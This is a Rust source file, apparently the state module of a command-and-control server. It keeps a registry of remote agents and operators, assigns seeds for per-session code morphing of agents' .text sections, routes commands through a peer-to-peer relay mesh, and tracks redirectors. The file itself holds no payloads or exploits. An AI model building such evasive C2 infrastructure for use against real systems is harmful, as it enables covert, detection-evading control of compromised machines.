//! Shared application state: the agent registry and pending-task table.
//!
//! ## Identity model
//!
//! The registry is keyed by a server-assigned **connection ID** (`Uuid`), not
//! by the agent-reported `agent_id`.  A malicious agent cannot hijack another
//! agent's slot by claiming its `agent_id`; the worst it can do is add a
//! duplicate entry under its own connection ID, which the operator can see in
//! the dashboard and clean up by closing the rogue connection.

use crate::audit::AuditLog;
use crate::config::{OperatorRecord, ServerConfig};
use crate::redirector::RedirectorState;
use common::Message;
use dashmap::{DashMap, DashSet};
use rand::RngCore;
use serde::Serialize;
use std::collections::HashMap;
use std::sync::Arc;
use subtle::ConstantTimeEq;
use tokio::sync::{mpsc, oneshot, RwLock};

/// One connected agent.  `connection_id` is assigned by the server on accept.
/// `agent_id` and `hostname` are whatever the agent reported in its Heartbeat.
#[derive(Clone)]
pub struct AgentEntry {
    /// Server-assigned, per-connection UUID — the canonical registry key.
    pub connection_id: String,
    /// Self-reported agent identifier (informational; not trusted for routing).
    pub agent_id: String,
    pub hostname: String,
    pub last_seen: u64,
    /// Channel into the per-connection writer task.
    pub tx: mpsc::Sender<Message>,
    pub peer: String,
    /// Seed assigned by the server for per-session code morphing.  Sent to
    /// the agent during initial check-in and used to ensure no two active
    /// sessions share the same transformation seed.
    pub morph_seed: u64,
    /// SHA-256 hash of the agent's `.text` section after the most recent
    /// morph operation.  Updated when the agent reports a `MorphResult`.
    pub text_hash: Option<String>,
}

/// JSON-friendly snapshot of an agent for the dashboard.
#[derive(Serialize, Clone)]
pub struct AgentView {
    pub connection_id: String,
    pub agent_id: String,
    pub hostname: String,
    pub last_seen: u64,
    pub peer: String,
    pub morph_seed: u64,
    pub text_hash: Option<String>,
}

impl From<&AgentEntry> for AgentView {
    fn from(e: &AgentEntry) -> Self {
        Self {
            connection_id: e.connection_id.clone(),
            agent_id: e.agent_id.clone(),
            hostname: e.hostname.clone(),
            last_seen: e.last_seen,
            peer: e.peer.clone(),
            morph_seed: e.morph_seed,
            text_hash: e.text_hash.clone(),
        }
    }
}

// ── P2P topology map ───────────────────────────────────────────────────

/// One node in the P2P mesh topology.
#[derive(Clone, Debug, Serialize)]
pub struct TopologyNode {
    /// `agent_id` of this node's parent in the mesh (if any).
    pub parent: Option<String>,
    /// `agent_id`s of this node's direct children.
    pub children: Vec<String>,
    /// Depth in the mesh tree (0 for directly-connected agents).
    pub depth: u32,
}

/// Tracks the P2P mesh hierarchy so the server can route commands through
/// the relay chain to reach deeply-nested child agents.
#[derive(Clone, Debug, Default, Serialize)]
pub struct TopologyMap {
    /// Keyed by `agent_id`.
    pub nodes: HashMap<String, TopologyNode>,
    /// Maps `(parent_agent_id, child_agent_id)` → `link_id` on the parent.
    /// Populated from `P2pTopologyReport` data so the server can construct
    /// correct `P2pToChild` routing envelopes.
    #[serde(skip)]
    pub child_link_map: HashMap<(String, String), u32>,
}

pub struct AppState {
    /// Registry keyed by connection_id.
    pub registry: DashMap<String, AgentEntry>,
    pub pending: DashMap<String, oneshot::Sender<Result<String, String>>>,
    pub audit: Arc<AuditLog>,
    /// Legacy single-admin token kept for backward compat and as a fallback
    /// when no `[operators]` section is defined in the config.
    pub admin_token: String,
    /// Per-operator records keyed by operator ID.  Populated at startup from
    /// the `[operators]` TOML section.  When empty, the legacy `admin_token`
    /// is used instead.
    pub operators: HashMap<String, OperatorRecord>,
    pub command_timeout_secs: u64,
    pub config: ServerConfig,
    /// Set of morph seeds currently assigned to active agents.  Ensures no
    /// two concurrent sessions share the same seed, guaranteeing that each
    /// agent produces a unique `.text` section layout after morphing.
    pub assigned_seeds: DashSet<u64>,
    /// P2P mesh topology map, keyed by `agent_id`.  Updated when the server
    /// receives `P2pTopologyReport` messages from agents.  Protected by an
    /// async `RwLock` so topology reads don't block agent writes.
    pub topology: RwLock<TopologyMap>,
    /// Redirector chain registry.  Tracks registered redirectors, their
    /// health via heartbeat, and provides agent config generation.
    pub redirector_state: RedirectorState,
}

impl AppState {
    pub fn new(
        audit: Arc<AuditLog>,
        admin_token: String,
        command_timeout_secs: u64,
        config: ServerConfig,
    ) -> Self {
        // Build the operator store from config.
        let operators: HashMap<String, OperatorRecord> = config
            .operators
            .iter()
            .map(|(id, cfg)| (id.clone(), OperatorRecord::from_config(id, cfg)))
            .collect();
        if !operators.is_empty() {
            tracing::info!(
                count = operators.len(),
                "loaded operator credentials from config"
            );
        }
        Self {
            registry: DashMap::new(),
            pending: DashMap::new(),
            audit,
            admin_token,
            operators,
            command_timeout_secs,
            config,
            assigned_seeds: DashSet::new(),
            topology: RwLock::new(TopologyMap::default()),
            redirector_state: RedirectorState::new(),
        }
    }

    /// Look up a bearer token against the operator store.  Returns the
    /// operator ID on match, or `None` if no operator matched.
    ///
    /// Comparison is constant-time: the presented token is hashed with
    /// SHA-256, then compared against each stored hash with `subtle::ct_eq`.
    pub fn authenticate_operator(&self, presented_token: &str) -> Option<String> {
        let presented_hash = OperatorRecord::hash_token(presented_token);
        for (_id, op) in &self.operators {
            let ok: bool = presented_hash.as_bytes().ct_eq(op.token_hash.as_bytes()).into();
            if ok {
                let now = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap()
                    .as_secs();
                op.last_seen.store(
                    now,
                    std::sync::atomic::Ordering::Relaxed,
                );
                return Some(op.id.clone());
            }
        }
        None
    }

    /// Generate a unique morph seed that is not currently assigned to any
    /// active agent.  Uses rejection sampling with a random u64; collisions
    /// are astronomically unlikely but the loop guarantees correctness.
    pub fn generate_unique_seed(&self) -> u64 {
        let mut rng = rand::thread_rng();
        loop {
            let seed = rng.next_u64();
            // Avoid zero — it's the "no seed set" sentinel in the agent.
            if seed != 0 && !self.assigned_seeds.contains(&seed) {
                return seed;
            }
        }
    }

    /// Release a morph seed back to the available pool (called when an agent
    /// disconnects).
    pub fn release_seed(&self, seed: u64) {
        self.assigned_seeds.remove(&seed);
    }

    pub fn list_agents(&self) -> Vec<AgentView> {
        self.registry
            .iter()
            .map(|e| AgentView::from(e.value()))
            .collect()
    }

    /// Find an agent entry by its *reported* `agent_id`.
    /// When multiple connections report the same `agent_id` (e.g. a reconnect
    /// racing with the old socket cleanup) the most-recently-seen one wins.
    pub fn find_by_agent_id(&self, agent_id: &str) -> Option<AgentEntry> {
        self.registry
            .iter()
            .filter(|e| e.value().agent_id == agent_id)
            .max_by_key(|e| e.value().last_seen)
            .map(|e| e.value().clone())
    }

    /// Find an agent entry by its server-assigned `connection_id`.
    pub fn find_by_connection_id(&self, connection_id: &str) -> Option<AgentEntry> {
        self.registry.get(connection_id).map(|e| e.value().clone())
    }

    /// Record the SHA-256 hash of an agent's `.text` section after a morph
    /// operation.  Called when the agent sends a `MorphResult` message or
    /// when a `MorphNow` command response contains the hash.
    pub fn update_text_hash(&self, connection_id: &str, hash: &str) {
        if let Some(mut entry) = self.registry.get_mut(connection_id) {
            entry.value_mut().text_hash = Some(hash.to_string());
        }
    }

    /// Process an incoming `P2pTopologyReport` and update the topology map.
    ///
    /// The report is sent by an agent and lists its direct children.
    /// We rebuild the parent-child relationships based on the report:
    ///   - The reporting agent is each listed child's parent.
    ///   - The reporting agent's depth is computed from its own parent
    ///     (or 0 if it is directly connected to the server).
    pub async fn update_topology(
        &self,
        reporter_agent_id: &str,
        children: &[common::P2pChildInfo],
    ) {
        let mut topo = self.topology.write().await;

        // Determine the reporter's depth.  If the reporter is directly
        // connected (no parent in the topology), depth is 0.
        let reporter_depth = topo
            .nodes
            .get(reporter_agent_id)
            .and_then(|n| n.parent.as_ref())
            .and_then(|parent_id| topo.nodes.get(parent_id))
            .map(|n| n.depth + 1)
            .unwrap_or(0);

        // Collect child agent_ids.
        let child_ids: Vec<String> = children.iter().map(|c| c.agent_id.clone()).collect();

        // Populate the child_link_map with link_ids from the report.
        for child in children {
            topo.child_link_map.insert(
                (reporter_agent_id.to_string(), child.agent_id.clone()),
                child.link_id,
            );
        }

        // Ensure the reporter has a node entry.
        topo.nodes
            .entry(reporter_agent_id.to_string())
            .and_modify(|node| {
                node.children = child_ids.clone();
            })
            .or_insert(TopologyNode {
                parent: None,
                children: child_ids.clone(),
                depth: reporter_depth,
            });

        // Update each child's parent pointer and depth.
        for child_id in &child_ids {
            topo.nodes
                .entry(child_id.clone())
                .and_modify(|node| {
                    node.parent = Some(reporter_agent_id.to_string());
                    node.depth = reporter_depth + 1;
                })
                .or_insert(TopologyNode {
                    parent: Some(reporter_agent_id.to_string()),
                    children: Vec::new(),
                    depth: reporter_depth + 1,
                });
        }

        tracing::debug!(
            reporter = %reporter_agent_id,
            child_count = children.len(),
            total_nodes = topo.nodes.len(),
            "topology map updated"
        );
    }

    /// Walk the topology from a target `agent_id` up to a directly-connected
    /// ancestor, returning the ordered list of `(parent_agent_id, link_id)`
    /// pairs that form the relay chain from the server to the target.
    ///
    /// The first element is the directly-connected agent; subsequent elements
    /// are the link_id each parent must use to forward to the next hop.
    ///
    /// Returns `None` if the target is unknown or not reachable through any
    /// directly-connected agent.
    pub async fn route_to_agent(&self, target_agent_id: &str) -> Option<Vec<(String, u32)>> {
        let topo = self.topology.read().await;

        // Walk from the target up to the root, collecting (parent, link_id).
        let mut path = Vec::new();
        let mut current = target_agent_id.to_string();

        loop {
            let node = topo.nodes.get(&current)?;
            match &node.parent {
                Some(parent_id) => {
                    // Look up the link_id for this parent→child edge.
                    let link_id = topo
                        .child_link_map
                        .get(&(parent_id.clone(), current.clone()))
                        .copied()
                        .unwrap_or(0);
                    path.push((parent_id.clone(), link_id));
                    current = parent_id.clone();
                }
                None => {
                    // This node has no parent — it should be directly
                    // connected to the server.
                    break;
                }
            }
        }

        if path.is_empty() {
            return None;
        }

        // Reverse so it goes: [directly-connected agent, ..., target's parent].
        path.reverse();
        Some(path)
    }

    /// Remove an agent and all its descendants from the topology map.
    pub async fn remove_from_topology(&self, agent_id: &str) {
        let mut topo = self.topology.write().await;
        // Remove this agent from its parent's children list and link map.
        if let Some(node) = topo.nodes.remove(agent_id) {
            if let Some(parent_id) = &node.parent {
                if let Some(parent_node) = topo.nodes.get_mut(parent_id) {
                    parent_node.children.retain(|c| c != agent_id);
                }
                topo.child_link_map
                    .remove(&(parent_id.clone(), agent_id.to_string()));
            }
        }
        // Note: we don't recursively remove descendants because they'll
        // be cleaned up when their own heartbeats time out, or when the
        // parent reconnects and sends an updated topology report.
    }
}

pub fn now_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}
